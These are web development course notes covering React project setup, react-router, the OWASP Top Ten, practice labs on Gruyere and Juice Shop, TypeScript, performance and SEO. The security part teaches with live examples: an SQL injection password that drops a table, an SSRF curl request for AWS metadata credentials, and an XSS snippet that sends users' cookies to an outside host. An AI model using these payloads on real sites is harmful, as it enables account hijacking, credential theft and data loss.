import App from './App';
// -> Delete
// import reportWebVitals from './reportWebVitals';

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);

// -> Delete
// reportWebVitals();
```

If we run `npm start` again the application will run the same as before, but without testing or performance monitoring support. You can now insert a different package for these vital functions if you so desire.

If you want to strip the project down even more, you can also delete the robots.txt, manifest.json, and the logo\*.png files.

Temporarily deleting code is sometimes a good strategy to use when trying to learn how the code works. If everything is committed to Git then you can easily do experiments like this.

### JSX vs JS

The `create-react-app` CLI uses the `.js` (JavaScript) extension for JSX files instead of `.jsx`. The Babel transpiler will work with either one, but some editor tools will work differently based upon the extension. For this reason, you might consider renaming the `.js` files that actually contain JSX to use `.jsx` instead. The developers at AirBNB had an interesting [conversation](https://github.com/airbnb/javascript/pull/985) on this topic that you might browse if you would like to consider the differing opinions on this subject.

## Building a production release

Now that you have your React application the way that you like you need to build a production ready release. You do this by running `npm run build`. The executes the `build` script found in your `package.json`. The `build` script transpiles, minifies, and injects the proper JavaScript, and then outputs everything to a deployment ready version contained in a subdirectory named `build`.

```sh
➜  npm run build

Creating an optimized production build...
Compiled successfully.
```

The deployment scripts for Simon React creates a distribution package by calling `npm run build` and then copying the `build` directory out to your production server.

## Other React project generators

The `create-react-app` CLI is not the only tool that you can use to generate a templated React project. For example, there is also `nano-react-app`, that uses [Vite](https://vitejs.dev/) instead of [webpack](https://webpack.js.org/), and results in a very minimal collection of template files. If you are comfortable with what `create-react-app` is doing, then you might experiment with some of the other CLI alternatives. Otherwise, just stick with `create-react-app` for now.

A web framework router provides essential functionality for single page applications. With a multiple web page application the headers, footers, navigation, and common components must be either duplicated in each HTML page, or injected before the server sends the page to the browser. With a single page application the browser only loads one HTML page and then JavaScript is used to manipulate the DOM and give it the appearance of multiple pages. The router defines the routes a user can take through the application, and automatically manipulates the DOM to display the appropriate framework components.

React does not have a standard router package, and there are many that you can choose from. We will use [react-router-dom](https://www.npmjs.com/package/react-router-dom) Version 6. The simplified routing functionality of React-router-dom derives from the project [react-router](https://www.npmjs.com/package/react-router) for its core functionality. Do not confuse the two, or versions of react-router-dom before version 6, when reading tutorials and documentation.

<img src="reactRouter.jpg">

A basic implementation of the router consists of a `BrowserRouter` component that encapsulates the entire application and controls the routing action. The `Link` component captures user navigation events and modifies what is rendered by the `Routes` component by matching up the `to` and `path` attributes.

```jsx
// Inject the router into the application root DOM element
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  // BrowserRouter component that controls what is rendered
  // NavLink component captures user navigation requests
  // Routes component defines what component is routed to
  <BrowserRouter>
    <div className='app'>
      <nav>
        <NavLink to='/'>Home</Link>
        <NavLink to='/about'>About</Link>
        <NavLink to='/users'>Users</Link>
      </nav>

      <main>
        <Routes>
          <Route path='/' element={<Home />} exact />
          <Route path='/about' element={<About />} />
          <Route path='/users' element={<Users />} />
          <Route path='*' element={<Navigate to='/' replace />} />
        </Routes>
      </main>
    </div>
  </BrowserRouter>
);
```


The internet allows us to socially connect, conduct financial transactions, and provide access to sensitive individual, corporate, and government data. It is also accessible from every corner of the planet. This positions the internet as a tool that can make the world a much better place, but it also makes a very attractive target for those who would seek to do harm. Preventing that potential for harm needs to be in the forefront of you mind whenever you create or use a web application.

You can see bad actors at work on your very own server by using `ssh` to open a console to your server and reviewing the authorization log. The authorization log captures all of the attempts to create a session on your server.

```sh
sudo less +G /var/log/auth.log
```

The last entry in the log will be from your connection to the server.

```sh
Feb 23 16:26:54 sshd[319071]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
Feb 23 16:26:54 systemd-logind[480]: New session 1350 of user ubuntu.
Feb 23 16:26:54 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
```

However, you will see lots of other attempts with specific user names associated with common exploits. These all should be failing to connect, but if your server is not configured properly then an unauthorized access is possible. The sample of attempts below show the IP addresses of the attacker, as well as the user name that they used. Using the `whois` utility we can see that these attacks are originating from servers at DLive.kr in Korea, and DigitalOcean.com in the USA.

```sh
Feb 19 02:34:28 sshd[298185]: Invalid user developer from 27.1.253.142
Feb 19 02:37:12 sshd[298193]: Invalid user minecraft1 from 27.1.253.142
Feb 23 14:26:19 sshd[318868]: Invalid user siteadmin 174.138.72.191
Feb 23 14:22:18 sshd[318845]: Invalid user tester 174.138.72.191
```

As an experiment, one of our TAs created a test server with a user named `admin` with password `password`. Within 15 minutes, an attacker had logged in, bypassed all the restrictions that were in place, and started using the server to attack other servers on the internet.

Even if you don't think your application is valuable enough to require security, you need to consider that you might be creating a security problem for your users on other systems. For example, think about a simple game application where a user is required to provides a username and password in order to play the game. If the application's data is then compromised, then an attacker could use the password, used for the game application, to gain access to other websites where the user might have used the same password. For example, their social networking sites, work account, or financial institution.

## Security terminology

Web application security, sometimes called AppSec, is a subset of cybersecurity that specifically focuses on preventing security vulnerabilities within end-user applications. Web application security involves securing the frontend code running on the user's device and also the backend code running on the web server.

Here is a list of common phrases used by the security community that you should be familiar with.

- **Hacking** - The process of making a system do something it's not supposed to do.
- **Exploit** - Code or input that takes advantage of a programming or configuration flaw.
- **Attack Vector** - The method that a hacker employs to penetrate and exploit a system.
- **Attack Surface** - The exposed parts of a system that an attacker can access. For example, open ports (22, 443, 80), service endpoints, or user accounts.
- **Attack Payload** - The actual code, or data, that a hacker delivers to a system in order to exploit it.
- **Input sanitization** - "Cleaning" any input of potentially malicious data.
- **Black box testing** - Testing an application without knowledge of the internals of the application.
- **White box testing** - Testing an application by **with** knowledge of the source code and internal infrastructure.
- **Penetration Testing** - Attempting to gain access to, or exploit, a system in ways that are not anticipated by the developers.
- **Mitigation** - The action taken to remove, or reduce, a threat.

## Motivation for attackers

The following lists some common motivations at drives a system attack.

- **Disruption** - By overloading a system, encrypting essential data, or deleting critical infrastructure, an attacker can destroy normal business operations. This may be an attempt at extortion, or simply be an attempt to punish a business that that attacker does not agree with.
- **Data exfiltration** - By privately extracting, or publicly exposing, a system's data, an attacker can embarrass the company, exploit insider information, sell the information to competitors, or leverage the information for additional attacks.
- **Resource consumption** - By taking control of a company's computing resources an attacker can use it for other purposes such as mining cryptocurrency, gathering customer information, or attacking other systems.

## Examples of security failures

Security should always be a primary objective of any application. Building a web application that looks good and performs well, is a lot less important than building an application that is secure.

Here are a few examples where companies failed to properly prevent attacks to their systems.

- [$100 million dollars stolen through insider trading using SQL injection vulnerability](https://www.theverge.com/2018/8/22/17716622/sec-business-wire-hack-stolen-press-release-fraud-ukraine)
- [Log4Shell remote code execution vulnerability, 93% of cloud vulnerable at time of discovery, dubbed "the most severe vulnerability ever"](https://en.wikipedia.org/wiki/Log4Shell)
- [Russian hackers install backdoor on 18,000 government and Fortune 500 computers](https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack)
- [Hackers Hold Computers of 23 Texas Towns For Ransom](https://www.usnews.com/news/national-news/articles/2019-08-20/hackers-hold-computers-of-23-texas-towns-for-ransom)

## Common hacking techniques

There are a few common exploitation techniques that you should be aware of. These include the following.

- **Injection**: When an application interacts with a database on the backend, a programmer will often take user input and concatenate it directly into a search query. This allows a hacker can use a specially crafted query to make the database reveal hidden information or even delete the database.

- **Cross-Site Scripting (XSS)**: A category of attacks where an attacker can make malicious code execute on a different user's browser. If successful, an attacker can turn a website that a user trusts, into one that can steal passwords and hijack a user's account.

- **Denial of Service**: This includes any attack where the main goal is to render any service inaccessible. This can be done by deleting a database using an SQL injection, by sending unexpected data to a service endpoint that causes the program to crash, or by simply making more requests than a server can handle.

- **Credential Stuffing**: People have a tendency to reuse passwords or variations of passwords on different websites. If a hacker has a user's credentials from a previous website attack, then there is a good chance that they can successfully use those credentials on a different website. A hacker can also try to brute force attack a system by trying every possible combination of password.

- **Social engineering** - Appealing to a human's desire to help, in order to gain unauthorized access or information.

## What can I do about it?

Taking the time to learn the techniques a hacker uses to attack a system is the first step in preventing them from exploiting your systems. From there, develop a security mindset, where you always assume any attack surface will be used against you. Make security a consistent part of your application design and feature discussions. Here is a list of common security practices you should include in your applications.

- **Sanitize input data** - Always assume that any data you receive from outside your system will be used to exploit your system. Consider if the input data can be turned into an executable expression, or can overload computing, bandwidth, or storage resources.
- **Logging** - It is not possible to think of every way that your system can be exploited, but you can create an immutable log of requests that will expose when a system is being exploited. You can then trigger alerts, and periodically review the logs for unexpected activity.
- **Traps** - Create what appears to be valuable information and then trigger alarms when the data is accessed.
- **Educate** - Teach yourself, your users, and everyone you work with, to be security minded. Anyone who has access to your system should understand how to prevent physical, social, and software attacks.
- **Reduce attack surfaces** - Do not open access anymore than is necessary to properly provide your application. This includes what network ports are open, what account privileges are allowed, where you can access the system from, and what endpoints are available.
- **Layered security** - Do not assume that one safeguard is enough. Create multiple layers of security that each take different approaches. For example, secure your physical environment, secure your network, secure your server, secure your public network traffic, secure your private network traffic, encrypt your storage, separate your production systems from your development systems, put your payment information in a separate environment from your application environment. Do not allow data from one layer to move to other layers. For example, do not allow an employee to take data out of the production system.
- **Least required access policy** - Do not give any one user all the credentials necessary to control the entire system. Only give a user what access they need to do the work they are required to do.
- **Safeguard credentials** - Do not store credentials in accessible locations such as a public GitHub repository or a sticky note taped to a monitor. Automatically rotate credentials in order to limit the impact of an exposure. Only award credentials that are necessary to do a specific task.
- **Public review** - Do not rely on obscurity to keep your system safe. Assume instead that an attacker knows everything about your system and then make it difficult for anyone to exploit the system. If you can attack your system, then a hacker will be able to also. By soliciting public review and the work of external penetration testers, you will be able to discover and remove potential exploits.

The Open Web Application Security Project (OWASP) is a non-profit research entity that manages the _Top Ten_ list of the most important web application security risks. Understanding, and periodically reviewing, this list will help to keep your web applications secure.

The following is a discussion of each of the entries in the top ten list, along with examples, and suggested mitigations.

## A01 Broken Access Control

📖 **Deeper dive reading**: [snyk Learn broken access control](https://learn.snyk.io/lessons/broken-access-control/javascript/)

Broken access control occurs when the application doesn't properly enforce permissions on users. This could mean that a non-admin user can do things that only an admin should be able to do, or admin accounts are improperly secured. While browser application code can restrict access by disabling UI for navigating to sensitive functionality, the ultimate responsibility for enforcing access control rests upon the application service.

As an example of broken access control, consider an application where the UI only provides a navigation to the administrator application settings if the user is an administrator. However, the attacker can simply change the URL to point to the application settings URL and gain access. Additionally, unless the service endpoints reject requests to obtain, and update, the application settings, any restrictions that the UI provides are meaningless.

Mitigations include:

- Strict access enforcement at the service level
- Clearly defined roles and elevation paths

## A02 Cryptographic Failures

Cryptographic failures occur when sensitive data is accessible either without encryption, with weak encryption protocols, or when cryptographic protections are ignored.

Sending any unencrypted data over a public network connection allows an attacker to capture the data. Even private, internal, network connections, or data that is store without encryption, is susceptibly to exploitation once an attacker gains access to the internal system.

Examples of ineffective cryptographic methods include hashing algorithms like MD5 and SHA-1 that are trivial to crack with modern hardware and tools.

Another cryptographic failure happens when applications do not validate the provided web certificate when establishing a network connection. This is a case of falsely assuming that if the protocol is secure then the entity represented by the protocol is acceptable.

Mitigations include:

- Use strong encryption for all data. This includes external, internal, in transit, and at rest data.
- Updating encryption algorithms as older algorithms become compromised.
- Properly using cryptographic safeguards.

## A03 Injection

📖 **Deeper dive reading**: [Snyk Learn SQL injection](https://learn.snyk.io/lessons/sql-injection/javascript/)

Injection exploits occur when an attacker is allowed to supply data that is then injected into a context where it violates the expected use of the user input. For example, consider an input field that is only expected to contain a user's password. Instead the attacker supplies a SQL database command in the password input.

**Supplied password**

```js
`p@ssword!'; DROP TABLE db; --`;
```

The application then uses a template SQL query to validate the user's password.

**Template query**

```js
`SELECT user FROM db WHERE password='${password}' LIMIT 1`;
```

When the supplied input is injected into the template an unintended query results. Notice that this query will delete the entire database table.

**Resulting query**

```sql
SELECT user FROM db WHERE password='p@ssword!'; DROP TABLE db; -- ` LIMIT 1
```

Mitigations include:

- Sanitizing input
- Use database prepared statements
- Restricting execution rights
- Limit output

## A04 Insecure Design

📖 **Deeper dive reading**: [Snyk Learn insecure design](https://learn.snyk.io/lessons/insecure-design/javascript/)

Insecure design broadly refers to architectural flaws that are unique for individual systems, rather than implementation errors. This happens when the application team doesn't focus on security when designing a system, or doesn't continuously reevaluate the application's security.

Insecure design exploits are based upon unexpected uses of the business logic that controls the functionality of the application. For example, if the application allows for trial accounts to be easily created, then an attacker could create a denial of service attack by creating millions of accounts and utilizing the maximum allowable usage.

Mitigations include:

- Integration testing
- Strict access control
- Security education
- Security design pattern usages
- Scenario reviews

## A05 Security Misconfiguration

Security misconfiguration attacks exploit the configuration of an application. Some examples include using default passwords, not updating software, exposing configuration settings, or enabling unsecured remote configuration.

For example, some third party utilities, such as a logging system, will expose a public administration interface that has a default user name and password. Unless that configuration is changed, an attacker will be able to access all of the critical logging information for your application.

Mitigations include:

- Configuration reviews
- Setting defaults to disable all access
- Automated configuration audits
- Requiring multiple layers of access for remote configuration

## A06 Vulnerable and Outdated Components

📖 **Deeper dive reading**: [Snyk Learn vulnerable and outdate components](https://learn.snyk.io/lessons/vulnerable-and-outdated-components/javascript/)

The longer an application has been deployed, the more likely it is that the attack surface, and corresponding exploits, of the application will increase. This is primarily due to the cost of maintaining an application and keeping it up to date in order to mitigate newly discovered exploits.

Outdated components often accumulate as third party packages are used by the application. Over time the packages are updated in order to address security concerns, or somethings the packages stop being supported. When this happens your application becomes vulnerable. Consider what happens when a request to install NPM packages displays the following warning:

```sh
➜  npm install

up to date, audited 1421 packages in 3s

7 high severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
```

The application developer is warned that the components are vulnerable, but when faced choice of taking the time to update packages, and potentially break the application, or meeting deliverable deadlines, the developer is tempted to ignore the warning and continue without addressing the possible problem.

Mitigations include:

- Keeping a manifest of your software stack including versions
- Reviewing security bulletins
- Regularly updating software
- Required components to be up to date
- Replacing unsupported software

## A07 Identification and Authentication Failures

Identification and authentication failures include any situation where a user's identity can be impersonated or assumed by an attacker. For example, if an attacker can repeatedly attempt to guess a user's password, then eventually they will be successful. Additionally, if passwords are exposed outside of the application, or are stored inside the application, with weak cryptographic protection, then they are susceptible to attack.

Another example of an identification failure would be a weak password recovery process that doesn't properly verify the user. Common practices such as asking for well known security questions (e.g. mother's maiden name) from a user fall into this category.

Mitigations include:

- Rate limiting requests
- Properly managing credentials
- Multifactor authentication
- Authentication recovery

## A08 Software and Data Integrity Failure

Software and data integrity failures represent attacks that allow external software, processes, or data to compromise your application. Modern web applications extensively use open source and commercially produced packages to provide key functionality. Using these packages without conducting a security audit, gives them an unknown amount of control over your application. Likewise, using a third party processing workflow, or blindly accessing external data, opens you up to attacks.

Consider the use of a third party continuous delivery (CD) pipeline for deploying your application to a cloud provider. If the CD provider is penetrated by an attacker then they also gain access to your production cloud environment.

Another example is the use of an NPM package that is controlled by an attacker. Once the package has gained general acceptance, the attacker can subtly change the package to capture and deliver sensitive information.

Mitigations include:

- Only using trusted package repositories
- Using your own private vetted repository
- Audit all updates to third party packages and data sources

## A09 Security Logging and Monitoring Failures

📖 **Deeper dive reading**: [Snyk Learn logging vulnerabilities](https://learn.snyk.io/lessons/logging-vulnerabilities/javascript/)

Proper system monitoring, logging, and alerting is critical to increasing security. One of the first things an attacker will do after penetrating your application is delete or alter any logs that might reveal the attacker's presence. A secure system will store logs that are accessible, immutable, and contain adequate information to detect an intrusion, and conduct post-mortem analysis.

An attacker might also try to create a smoke screen in the monitoring system in order to hide a true attack. This might consist of a barrage of periodic ineffective attacks that hide the insertion of a slightly different effective one.

Mitigations include:

- Real time log processing
- Automated alerts for metric threshold violations
- Periodic log reviews
- Visual dashboards for key indicators

## A10 Server Side Request Forgery (SSRF)

📖 **Deeper dive reading**: [Snyk Learn SSRF](https://learn.snyk.io/lessons/ssrf-server-side-request-forgery/javascript/)

This category of attack causes the application service to make unintended internal requests, that utilized the service's elevated privileges, in order to expose internal data or services.

For example, if your service exposed an endpoint that let a user retrieve an external profile image based upon a supplied URL, an attacker could change the URL to point to a location that is normally only available to the service internally.

The following command would theoretically return the internal AWS service metadata that includes the administrative access token.

```sh
curl https://yourdomain.click/user/image?imgUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin-Role
```

Mitigations include:

- Sanitizing returned data
- Not returning data
- Whitelisting accessible domains
- Rejecting HTTP redirects

# Security practice

You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.

## Gruyere

[Gruyere](https://google-gruyere.appspot.com) provides tutorials and practice with things like Cross-site scripting (XSS), Denial of Service (DoS), SQL injection, and elevation of privilege attacks.

Gruyere runs on Google AppEngine and so it is easy to start, play with, and reset when you want to start over.

You can learn about how to use Gruyere by reading the set up [page](https://google-gruyere.appspot.com/part1). Make sure you notice the **Table of Contents** located on the right side of the page in order to learn about the different attacks and how to exploit them.

You start the practice environment by following this [link](https://google-gruyere.appspot.com/start). This will display a page that looks like the following.

![Gruyere](gruyereHome.jpg)

For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.

### Cross-Site Scripting (XSS)

Open the [Gruyere Instruction](https://google-gruyere.appspot.com/part2) on XSS. Take some time to read the description of XSS attacks and then open up the practice instance of Gruyere that you created above.

Using what we have learned from the tasks, hints, and examples described in the Gruyere instruction, we will create our own XSS attack.

1. Create an account in the Gruyere application using some bogus user name and password.
1. Navigate back to the home page.
1. Select the `New Snippets` option in order to create a snippet that will show on the home screen for all users of the application.

   The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.

1. Paste the following into the snippet input box and press submit.
   ```html
   <img src="null" onerror="document.body.style.background='white'" />
   ```
   ![XSS Snippet submission](gruyereXssSnippetSubmit.jpg)

Now, whenever any user of Gruyere goes to their home page they will see your snippet, and it will execute the JavaScript XSS attack and turn their body background color white.

![XSS Snippet result](gruyereXssSnippetResult.jpg)

If you logout of Gruyere and create a new user account, you will see that your attack works on all users.

Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.

```html
<img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />
```

If you create another snippet with the above example, open up the network tab in the browser's dev tools, and navigate to the Gruyere home page, you will see the browser attempting to send the user's cookie to `hkz.click`.

![XSS cookie grab](gruyereXssSnippetCookieGrab.jpg)

## Juice Shop

![Juice Shop](JuiceShopLogo.png)

OWASP provides a security training application called [Juice Shop](https://github.com/juice-shop/juice-shop#-owasp-juice-shop). Unlike Gruyere, You need to download the code for Juice Shop and run it from your own computer, but the advantage is that you have complete control over Juice Shop and it is a really good practice application.

If you are at all interested in improving your security skills, you should take the time to install and explore Juice Shop. Otherwise what you have done with Gruyere should be enough to give you a feel for what security practice applications have to offer.

### Installing Juice Shop

1. Clone the Juice Shop repository to your development environment and install the required NPM packages.

   ```sh
   git clone https://github.com/juice-shop/juice-shop.git --depth 1

   cd juice-shop

   npm install
   ```

1. Run the application. This should start Juice Shop on port 3000.
   ```sh
   npm start
   ```
1. You can now open your browser to `localhost:3000`. This will display the Juice Shop application.

   ![JuiceShop Home](juiceShopHome.jpg)

The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.

You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the `main.js` file in Dev Tools and seeing that it references a path named `score-board`. So if you change the url to be `localhost:3000/#/score-board` you will see the following view.

![JuiceShop Home](juiceShopScoreBoard.jpg)

You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.

To begin, it is suggested that you do the `DOM XSS` tutorial. This will show you how to do a XSS attack using the application search input.

TypeScript adds static type checking to JavaScript. This provides type checking while you are writing the code to prevent mistakes like using a string when a number is expected. Consider the following simplistic JavaScript code example.

```js
function increment(value) {
  return value + 1;
}

let count = 'one';
console.log(increment(count));
```

When this code executes the console will log `one1` because the count variable was accidentally initialized with a string instead of a number.

With TypeScript you explicitly define the types, and as the JavaScript is transpiled (with something like Babel) an error will be generate long before the code is seen by a user. To provide type safety for our increment function, it would look like this:

```ts
function increment(value: number) {
  return value + 1;
}

let count: number = 'one';
console.log(increment(count));
```

With TypeScript enabled, VS Code will analyze the code and give you an error about the invalid type conversion.

![TypeScript bad assignment](typescriptBadAssignment.jpg)

In addition to defining types for function parameters, you can define the types of object properties. For example, when defining the state for a React class style component, you can specify the types of all the state and property values.

```ts
export class About extends React.Component {
  state: {
    imageUrl: string;
    quote: string;
    price: number;
  };

  constructor(props: { price: number }) {
    super(props);

    this.state = {
      imageUrl: '',
      quote: 'loading...',
      price: props.price,
    };
  }
}
```

You can likewise specify the type of a React function style component's properties with an inline object definition.

```ts
function Clicker(props: { initialCount: number }) {
  const [count, updateCount] = React.useState(props.initialCount);

  return <div onClick={() => updateCount(1 + count)}>Click count: {count}</div>;
}
```

## Interfaces

Because it is so common to define object property types, TypeScript introduced the use of the `interface` keyword to define a collection of parameters and types that an object must contain in order to satisfy the interface type. For example, a Book interface might look like the following.

```ts
interface Book {
  title: string;
  id: number;
}
```

You can then create an object and pass it to a function that requires the interface.

```ts
function catalog(book: Book) {
  console.log(`Cataloging ${book.title} with ID ${book.id}`);
}

const myBook = { title: 'Essentials', id: 2938 };
catalog(myBook);
```

## Beyond type checking

TypeScript also provides other benefits, such as warning you of potential uses of an uninitialized variable. Here is an example of when a function may return null, but the code fails to check for this case.

![TypeScript uninitialized](typescriptUninitialized.jpg)

You can correct this problem with a simple `if` block.

```ts
const containerEl = document.querySelector<HTMLElement>('#picture');
if (containerEl) {
  const width = containerEl.offsetWidth;
}
```

Notice that in the above example, the return type is coerced for the `querySelector` call. This is required because the assumed return type for that function is the base class `Element`, but we know that our query will return the subclass `HTMLElement` and so we need to cast that to the subclass with the `querySelector<HTMLElement>()` syntax.

### Unions

TypeScript introduces the ability to define the possible values for a new type. This is useful for doing things like defining an enumerable.

With plain JavaScript you might create an enumerable with a class.

```js
export class AuthState {
  static Unknown = new AuthState('unknown');
  static Authenticated = new AuthState('authenticated');
  static Unauthenticated = new AuthState('unauthenticated');

  constructor(name) {
    this.name = name;
  }
}
```

With TypeScript you can define this by declaring a new type and defining what its possible values are.

```ts
type AuthState = 'unknown' | 'authenticated' | 'unauthenticated';

let auth: AuthState = 'authenticated';
```

You can also use unions to specify all of the possible types that a variable can represent.

```ts
function square(n: number | string) {
  if (typeof n === 'string') {
    console.log(`{$n}^2`);
  } else {
    console.log(n * n);
  }
}
```

## Using TypeScript

If you would like to experiment with TypeScript you can use [CodePen](https://codepen.io), or the official [TypeScript playground](https://www.typescriptlang.org/play). The TypeScript playground has the advantage of showing you inline errors and what the resulting JavaScript will be.

![typescript playground](typescriptPlayground.jpg)

To use TypeScript in your web application you can create your project using the `create-react-app` CLI and specifying the `--template typescript` switch. This will configure the template application to use TypeScript.

```sh
npx create-react-app my-app --template typescript
```

If you want to convert an existing application, then install the NPM `typescript` package to your development dependencies.

```sh
npm install --save-dev typescript
```

This will only include typescript package when you are developing and will not distribute it with a production bundle.

Once you have TypeScript installed for your project, you then configure how you want TypeScript to interact with your code by creating a `tsconfig.json` file.

If your project structure is configured to have your source code in a directory named `src`, and you want to output to a directory named `build` then you would use the following TS configuration file.

```js
{
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "build",
    "target": "es5",
    "lib": [
      "dom",
      "dom.iterable",
      "esnext"
    ],
    "allowJs": true,
    "skipLibCheck": true,
    "esModuleInterop": true,
    "allowSyntheticDefaultImports": true,
    "strict": true,
    "forceConsistentCasingInFileNames": true,
    "noFallthroughCasesInSwitch": true,
    "module": "esnext",
    "moduleResolution": "node",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true,
    "jsx": "react-jsx"
  },
  "include": [
    "./src/**/*"
  ]
}
```

To learn what all of the tsconfig.json options do, refer to [What is a tsconfig.json](https://www.typescriptlang.org/docs/handbook/tsconfig-json.html).

The performance of your application plays a huge role in determining user satisfaction. The following statistics show the impact that just one second of delay can make.

![Latency impact](performanceLatencyImpact.jpg)

> **Source**: WPEngine

In order to prevent losing users, you want your application to load in about one second. That means you need consistently measure and improve the responsiveness of your application. The main things you want to monitor include:

1. Browser application latency
1. Network latency
1. Service endpoint latency

For the context of this discussion, latency is defined as the delay that your user experiences before a request is satisfied.

Let's look at each of these performance areas, and then we can suggest some tools for measuring and improving the results.

## Browser application latency

Browser application latency is impacted by the speed of the user's device, the amount of data that needs to be processed, and the time complexity of the processing algorithm.

When a user requests your application in a browser, the browser will request your `index.html` page first. This is followed by requests for any files that `index.html` links, such as JavaScript, CSS, video, and image files. Once your JavaScript is loaded, it will start making requests to services. This includes any endpoints that your provide as well as ones provided by third parties. Each of those requests takes time for the browser to load and render. A page with lots of large images and lots of service calls, will take longer than a page that only loads simple text from a single HTML file.

Likewise, if your JavaScript does significant processing while a page is loading, then your user will notice the resulting latency. You want to make application processing as asynchronous as possible so that it is done in the background without impacting the user experience.

You can reduces the impact of file size, and HTTP requests in general, by doing one or more of the following:

1. Use compression when transferring files over HTTP.
1. Reduce the quality of images and video to the lowest acceptable level.
1. Minify JavaScript and CSS. This removes all whitespace and creates smaller variable names.
1. Use HTTP/2 or HTTP/3 so that your HTTP headers are compressed and the communication protocol is more efficient.

You can also reduce the number of requests you make by combining the responses from multiple endpoint requests into a single request. This eliminates duplicated fields, but also decreases the overhead associated with each request.

## Network latency

You pay a latency price for every network request that you make. For this reason, you want to avoid making unnecessary or large requests.

Network latency is impacted by the amount of data that you send, the amount of data a user can receive per second (this is called bandwidth), and the distance the data has to travel.

If the user has a low bandwidth connection that can only receive data at rates lower than 1 megabit per second, then you need to be very careful to reduce the number of bytes that you send to that user. Global latency is also a problem for users. If your application is hosted in a data center located in San Francisco, and used by someone living in Nairobi, then there will be a additional latency of 100 to 400 milliseconds for each request.

You can mitigate the impact of global latency by hosting your application files in data centers that are close to the users you are trying to serve. Applications that are seeking to reach a global audience will often host their application from dozens of places around the world.

## Service endpoint latency

Service endpoint latency is impacted by the number of request that are made and the amount of time that it takes to process each request.

When a web application makes a request to a service endpoint there is usually some functionality in the application that is blocked until the endpoint returns. For example, if a user requests the scores for a game, the application will delay rendering until those scores are returned.

You want to reduce the latency of your endpoints as much as possible. Ideally you want to keep the endpoint latency to less than 10 milliseconds (ms). This may seem like a very short time, but commonly, an application will make dozens of endpoint requests to render a component. If each of those endpoints take 10 ms, then you are looking at 100 to 200 ms. When you add network latency to the time it takes for the application to process the response, and then add the time it takes for the browser to render, you can easily exceed the desired 1 second load time.

## Performance tools

📖 **Deeper dive reading**: [Chrome performance tools](https://developer.chrome.com/docs/devtools/performance/)

### Chrome network tab

You can see the network requests made by your application and the time necessary for each request, by using the browser's debugging tools. This will show you what files and endpoints are requested and how long they are taking. If you sort by `time` or `size`, it will be clearer what areas need your attention. Make sure you clear your cache before running tests so that you can see what the real latency is and not just the time it takes to load from the browser's cache.

![Performance](../../uxdesign/designPerformanceNetwork.jpg)

### Simulating real users

The network tools in the Chrome debugger also allows you to simulate low bandwidth connections by throttling your network. For example, you can simulate a 3G network connection that you would find on a low end mobile phone.

![Throttle network](webFrameworksThrottleNetwork.jpg)

Throttling while testing is really useful since web developers often have high end computers and significant network bandwidth. That means you are not having the same experience as your users, and you will be surprised when they don't use your application because it is so slow.

### Chrome Lighthouse

You can also use the Chrome debugging Lighthouse tool to run an analysis of your application. This will give you an average performance rating based upon the initial load time, longest content paint, and time before the user can interact with the page.

![Performance](../../uxdesign/designPerformance.jpg)

### Chrome performance tab

When you are ready to dig into your application's frontend performance make sure you experiment with the Chrome debugger's performance tab. This breaks down the details of your application based upon discrete intervals of time so that you can isolate where things are running slow.

![Performance tab](webFrameworksChromePerformanceTab.jpg)

You start profiling the performance by pressing the record button and then interacting with your application. Chrome will record memory usage, screenshots, and timing information. You can then press the stop recording button and review the collected data. For example, the performance data represented in the image above, shows that 56% of the execution time was used in the `button.press` function. If you drill in on the source code for the function you will see exactly which lines of the function were consuming the processing time.

### Global speed tests

You also want to test your application from different locations around the world. There are many online providers that will run these test for you. Here are the results for running a test using [Pingdom.com](https://tools.pingdom.com).

![Pingdom](webFrameworksPingdom.jpg)

You can see that it is correctly suggesting that we enable gz compression on our transmitted data in order to increase performance, and to add headers that will enable caching on the browser.

This tool provided by [DotComTools](https://www.dotcom-tools.com) allows you to run tests from multiple locations at once.

![DotCom Tools](webFrameworksDotComTools.jpg)

Here you can see we perform acceptably from the United States and Europe, but are struggling in Asia. That makes sense considering that our server is located in North Virginia. In order to correct this, we need to use a Content Delivery Network (CDN) with an additional location closer to our target users in China.

Once Google became the de facto search engine for the internet, a new industry was created to help websites get the top search result spots. Modifying your application for search results is called search engine optimization (SEO). While SEO has nothing to do with the functionality of your application, it has everything to do with its success. You can save millions of dollars in marketing if your application appears in the top search ranking for common user searches.

There are several factors that are major contributors to your search rank. These include:

1. Content
1. Authoritative links
1. Structure and organization
1. Metadata
1. Performance and usability

Let's take a closer look at each of these.

## Content

Search engines pay a lot of attention to the value an application provides. One of the ways you can provide significant value is to host interesting, current, easily accessible content. For example, if your application is about the game Simon, then you should include a history of the game, strategies for playing the game, current news about competitions, and biographies of the world's best players. The key is that there is lots of interesting content and that it is kept current.

You want to make sure that you provide both textual and video content. Also make sure that the content is available without authentication or payment.

## Authoritative links

The success of the Google Page Rank algorithm is founded on determining how authoritative an application is. The more websites that point to your application the higher its search ranking will be. If you can get an influencer to link to your content, or get links from other authoritative applications you will see a significant bump in your ranking.

